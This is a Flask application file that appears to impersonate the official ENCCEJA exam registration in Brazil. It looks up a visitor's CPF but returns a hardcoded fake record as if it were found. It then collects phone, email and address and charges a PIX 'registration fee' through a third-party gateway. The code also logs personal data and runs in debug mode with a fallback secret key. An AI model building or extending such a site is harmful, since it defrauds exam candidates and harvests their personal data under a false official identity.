from flask import Flask, render_template, request, session, redirect, url_for, jsonify
import os
import logging
from dotenv import load_dotenv

# Carregar variáveis de ambiente
load_dotenv()

app = Flask(__name__)
app.secret_key = os.environ.get("SESSION_SECRET", "encceja_secret_2025")

# Configurar logging
logging.basicConfig(level=logging.INFO)

@app.route('/')
def index():
    """Página inicial - Consulta CPF"""
    user_data = session.get('user_data', {'nome': '', 'cpf': '', 'phone': ''})
    app.logger.info(f"[PROD] Renderizando página inicial para: {user_data}")
    
    return render_template('index.html', user_data=user_data)

@app.route('/encceja-info', methods=['GET', 'POST'])
def encceja_info():
    """Página de dados encontrados"""
    if request.method == 'POST':
        cpf = request.form.get('cpf', '').replace('.', '').replace('-', '')
        
        # Simular dados encontrados
        fake_data = {
            'nome': 'JOÃO DA SILVA SANTOS',
            'cpf': cpf,
            'rg': '12.345.678-9',
            'data_nascimento': '15/03/1985',
            'nome_mae': 'MARIA SANTOS',
            'situacao': 'APTO PARA INSCRIÇÃO'
        }
        
        session['user_data'] = fake_data
        return render_template('encceja_info.html', user_data=fake_data)
    
    return redirect(url_for('index'))

@app.route('/validar-dados', methods=['GET', 'POST'])
def validar_dados():
    """Página de validação de dados"""
    user_data = session.get('user_data', {})
    
    if request.method == 'POST':
        # Atualizar dados do usuário
        user_data.update({
            'telefone': request.form.get('telefone', ''),
            'email': request.form.get('email', ''),
            'endereco': request.form.get('endereco', ''),
            'cidade': request.form.get('cidade', ''),
            'estado': request.form.get('estado', '')
        })
        session['user_data'] = user_data
        return redirect(url_for('pagamento'))
    
    return render_template('validar_dados.html', user_data=user_data)

@app.route('/pagamento')
def pagamento():
    """Página de pagamento PIX"""
    user_data = session.get('user_data', {})
    
    if not user_data.get('cpf'):
        return redirect(url_for('index'))
    
    return render_template('pagamento.html', user_data=user_data)

@app.route('/criar-pagamento-pix', methods=['POST'])
def criar_pagamento_pix():
    """Criar pagamento PIX via WitePay"""
    try:
        from witepay_gateway import create_witepay_payment
        
        amount = 93.40
        result = create_witepay_payment(amount, "Inscrição ENCCEJA 2025")
        
        if result.get('success'):
            session['payment_data'] = result
            return jsonify({
                'success': True,
                'transaction_id': result.get('transaction_id'),
                'pix_code': result.get('pix_code'),
                'qr_code': result.get('qr_code'),
                'amount': result.get('amount')
            })
        else:
            return jsonify({
                'success': False,
                'error': 'Erro ao gerar pagamento PIX'
            })
    
    except Exception as e:
        app.logger.error(f"Erro ao criar pagamento: {e}")
        return jsonify({
            'success': False,
            'error': 'Erro interno do servidor'
        })

@app.route('/verificar-pagamento/<transaction_id>')
def verificar_pagamento(transaction_id):
    """Verificar status do pagamento"""
    try:
        from witepay_gateway import check_payment_status
        
        result = check_payment_status(transaction_id)
        return jsonify(result)
    
    except Exception as e:
        app.logger.error(f"Erro ao verificar pagamento: {e}")
        return jsonify({
            'status': 'pending',
            'paid': False
        })

@app.route('/witepay-postback', methods=['POST'])
def witepay_postback():
    """Receber notificações do WitePay"""
    try:
        data = request.get_json()
        app.logger.info(f"Postback recebido: {data}")
        
        # Processar postback
        status = data.get('status', '').upper()
        if status in ['PAID', 'COMPLETED', 'APPROVED']:
            app.logger.info("Pagamento confirmado via postback")
        
        return jsonify({'status': 'ok'})
    
    except Exception as e:
        app.logger.error(f"Erro no postback: {e}")
        return jsonify({'status': 'error'})

@app.route('/obrigado')
def obrigado():
    """Página de agradecimento"""
    return render_template('obrigado.html')

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)